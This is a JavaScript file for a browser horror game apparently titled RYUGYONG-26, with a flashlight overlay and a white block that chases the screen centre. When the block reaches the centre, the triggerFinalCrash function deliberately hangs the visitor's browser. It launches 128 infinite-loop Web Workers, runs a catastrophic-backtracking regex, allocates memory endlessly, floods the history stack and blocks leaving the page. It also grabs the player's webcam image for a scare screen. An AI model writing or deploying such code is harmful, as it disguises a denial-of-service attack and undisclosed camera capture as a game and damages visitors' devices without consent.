/* PROJECT: RYUGYONG-26 / ABSOLUTE DEADLOCK
   FIX: Initialization Delay & First-Time Activation
*/

let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let videoStream = null;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 攝像頭權限 (Soul Access)
async function setupCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoStream = stream;
    } catch (err) {
        console.log("Camera access denied.");
    }
}

// 2. 音頻過載準備
function startCreepyVoice() {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.95;
            } else {
                let g = (t & (t >> 8)) ? 0.06 : -0.06;
                output[i] = (Math.random() * 0.08) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
}

// 3. 【核心修正】白色靈魂獵殺邏輯 (只在啟動後執行)
function spawnHunter() {
    setTimeout(() => {
        if (systemCrashed) return;
        const glitchBlock = document.createElement('div');
        const side = Math.floor(Math.random() * 4);
        let startX, startY;
        if (side === 0) { startX = -100; startY = Math.random() * window.innerHeight; }
        else if (side === 1) { startX = window.innerWidth + 100; startY = Math.random() * window.innerHeight; }
        else if (side === 2) { startX = Math.random() * window.innerWidth; startY = -100; }
        else { startX = Math.random() * window.innerWidth; startY = window.innerHeight + 100; }

        glitchBlock.style.cssText = `position:fixed; width:40px; height:40px; background:white; z-index:10001; left:${startX}px; top:${startY}px; box-shadow:0 0 40px 10px white; transition:transform 0.05s linear; pointer-events:none;`;
        document.body.appendChild(glitchBlock);

        let currentX = startX, currentY = startY;
        const speed = 4.8; 

        const hunterInterval = setInterval(() => {
            if (systemCrashed) { clearInterval(hunterInterval); return; }
            const centerX = window.innerWidth / 2, centerY = window.innerHeight / 2;
            const dx = centerX - (currentX + 20), dy = centerY - (currentY + 20);
            const distance = Math.sqrt(dx * dx + dy * dy);

            if (distance < 35) {
                triggerFinalCrash();
                glitchBlock.remove();
                clearInterval(hunterInterval);
            } else {
                currentX += (dx / distance) * speed;
                currentY += (dy / distance) * speed;
                glitchBlock.style.left = `${currentX}px`;
                glitchBlock.style.top = `${currentY}px`;
                const scale = 1 + (250 / distance); 
                glitchBlock.style.transform = `scale(${scale})`;
            }
        }, 16);
    }, 25000); // 啟動 25 秒後開始獵殺
}

// 4. 【啟動門戶】統一啟動函數
const startGame = async () => {
    if (audioStarted) return;
    audioStarted = true;

    // A. 請求權限
    await setupCamera();
    startCreepyVoice();

    // B. 強制全屏 (User Gesture 要求)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    // C. 隱藏 UI 並啟動獵殺計時
    intro.style.display = 'none';
    isLightOn = true;
    spawnHunter(); // <--- 白色靈魂依家先開始計時
    
    console.log("RYUGYONG-26: BEHIND YOU.");
};

// 監聽：點擊或觸摸
intro.addEventListener('click', startGame);
intro.addEventListener('touchstart', startGame);

// 5. 攝像頭奪魂
function captureAndDistort() {
    if (!videoStream) return;
    const canvas = document.createElement('canvas');
    const video = document.createElement('video');
    video.srcObject = videoStream;
    video.play();
    setTimeout(() => {
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.filter = 'grayscale(100%) contrast(1000%) brightness(25%)';
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg');
        const ds = document.getElementById('death-screen');
        if (ds) ds.style.backgroundImage = `url(${dataUrl})`;
        videoStream.getTracks().forEach(t => t.stop());
    }, 50);
}

// 6. 絕對死鎖 (Roblox Mode)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red; margin:0; animation: shake 0.1s infinite;">HELP ME.</h1>
        </div>
    `;

    captureAndDistort();
    window.onbeforeunload = () => "STAY.";

    setTimeout(() => {
        const b = new Blob([`while(true){postMessage(0)}`], {type:'text/javascript'});
        const u = URL.createObjectURL(b);
        for(let i=0; i<128; i++) new Worker(u);

        const vault = [];
        function lock() {
            const bomb = /^(a+)+$/;
            bomb.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); 
            const s = Date.now();
            while(Date.now() - s < 1500) { Math.atan2(Math.random(), 1); } 
            for(let i=0; i<50; i++) {
                vault.push(new BigUint64Array(1024 * 10)); 
                window.history.pushState(null, null, "#" + Math.random());
            }
            Promise.resolve().then(lock);
            setTimeout(lock, 0); 
        }
        lock();
    }, 100);
}

// 7. 控制
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
});

window.addEventListener('keydown', (e) => {
    let k = e.key.toLowerCase();
    if (k === 'f') startGame(); // 按 F 也可以啟動
    
    if (systemCrashed) return;
    if (k === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'black';
    }
    const spd = 60;
    if (k === 'w') posY += spd; if (k === 's') posY -= spd;
    if (k === 'a') posX += spd; if (k === 'd') posX -= spd;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
